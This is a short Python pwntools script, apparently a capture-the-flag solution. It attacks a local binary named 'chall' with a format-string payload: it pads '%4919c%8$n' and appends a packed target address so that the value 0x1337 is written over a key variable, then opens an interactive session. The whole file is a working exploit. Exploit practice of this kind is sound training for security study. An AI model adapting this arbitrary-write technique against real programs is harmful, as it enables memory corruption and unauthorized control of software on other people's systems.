from pwn import *

p = process('./chall')

key = 0x40408c

payload = f'%{4919}c%8$n'.encode()
payload = payload.ljust(16, b'\x00')
payload += p64(key)

p.sendlineafter(b"What's your name?", payload)

p.interactive()